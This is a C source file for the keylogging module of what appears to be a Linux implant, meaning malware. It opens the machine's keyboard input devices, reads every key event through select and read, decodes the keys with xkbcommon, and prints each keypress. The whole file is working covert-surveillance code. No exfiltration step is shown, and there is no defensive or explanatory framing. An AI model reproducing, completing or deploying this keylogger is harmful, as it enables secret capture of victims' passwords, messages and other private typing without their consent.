
/*
   key-logging is done here......yeah
*/


#include "implant.h"
#include <alloca.h>
#include <bits/types/struct_timeval.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <sys/select.h>
#include <linux/input.h>
#include <sys/types.h>
#include <unistd.h>
#include <xkbcommon/xkbcommon.h>


static int get_highest_fd(int *kbfd, int *i) {
    if (!kbfd)
        return -1;

    int highest = -1;
    for (*i = 0; kbfd[*i] != -1; (*i)++)
        highest = (highest < kbfd[*i]) ? kbfd[*i] : highest;
    return highest;
}

static int log_keyboard(int fd, implant_t *instance, struct xkb_state *state) {
    struct input_event evt = {0};

    ssize_t bytes_read = read(fd, &evt, sizeof(evt));
    if (bytes_read != sizeof(evt)) {
        DEBUG_LOG(
            instance->debug_enabled,
            "[!] read() error: %s",
            strerror(errno)
        );

        return ERROR;
    }

    // 1 = is_pressed
    if (evt.type == EV_KEY && evt.value == 1) {
        char key_description[256] = {0};
        xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, evt.code + 8);

        xkb_keysym_get_name(keysym, key_description, 256);
        printf("[+] Key pressed: %s\n", key_description);
    }

    return SUCCESSFUL;
}


/*
    main loop to listen for keys and stuff
*/
void keylog(implant_t *instance) {


    /* first set up select etc */
    int nb_kb = 0;
    int highest_fd = get_highest_fd(instance->kb_fd, &nb_kb);
    fd_set rd, err;
    int status = 0;

    if (highest_fd < 0 || !nb_kb) {
        DEBUG_LOG(
            instance->debug_enabled,
            "[!] no keyboard found. exiting"
        );
        return;
    }


    /*
       initialize xkbcommon context

       this is the stuff that allows us to maps keys to
       the correct language & manages special characters, shift, etc.
    */

    struct xkb_context *context = NULL;
    struct xkb_keymap *keymap = NULL;
    struct xkb_state *state = NULL;

    context = xkb_context_new(0);
    if (!context) {
        DEBUG_LOG(
            instance->debug_enabled,
            "[!] error with xkb_context_new(): %s",
            strerror(errno)
        );

        return;

    }

    keymap = xkb_keymap_new_from_names(context, NULL, 0);
    if (!keymap) {
        DEBUG_LOG(
            instance->debug_enabled,
            "[!] error with xkb_keymap_new_from_names(): %s",
            strerror(errno)
        );

        goto LOG_FUNCTION_CLEANUP;
    }

    state = xkb_state_new(keymap);
    if (!state) {
        DEBUG_LOG(
            instance->debug_enabled,
            "[!] error with xkb_state_new(): %s",
            strerror(errno)
        );

        goto LOG_FUNCTION_CLEANUP;
    }


    /* run the damn loop */
    while (1) {

        /* setup FD-sets */
        for (int i = 0; i < nb_kb; i++) {
            FD_SET(instance->kb_fd[i], &rd);
            FD_SET(instance->kb_fd[i], &err);
        }

        /* check if a key has been pressed */
        status = select(highest_fd + 1, &rd, NULL, &err, (instance->debug_enabled) ? &(struct timeval){1, 0}: NULL);
        if (status < 0) {
            DEBUG_LOG(
                instance->debug_enabled,
                "[!] select error: %s",
                strerror(errno)
            );

            goto LOG_FUNCTION_CLEANUP;
        }

        /* check file descriptors (first for error, then for new input) */
        for (int i = 0; i < nb_kb; i++) {
            if (FD_ISSET(instance->kb_fd[i], &err)) {
                DEBUG_LOG(
                    instance->debug_enabled,
                    "[!] Error on file descriptor %d",
                    instance->kb_fd[i]
                );

                /*
                    TODO: replace array of keyboard fd by a linked list so
                    that it can cleanly be removed without breaking the
                    logger
                */

                goto LOG_FUNCTION_CLEANUP;
            }

            /* checking for new input here */
            if (FD_ISSET(instance->kb_fd[i], &rd)) {

                /* TODO: should we really kill the run here or can we recover this ? */
                if (log_keyboard(instance->kb_fd[i], instance, state) == ERROR)
                    goto LOG_FUNCTION_CLEANUP;
            }

        }

    }


LOG_FUNCTION_CLEANUP:
    if (state != NULL)
        xkb_state_unref(state);

    if (keymap != NULL)
        xkb_keymap_unref(keymap);

    if (context != NULL)
        xkb_context_unref(context);

}
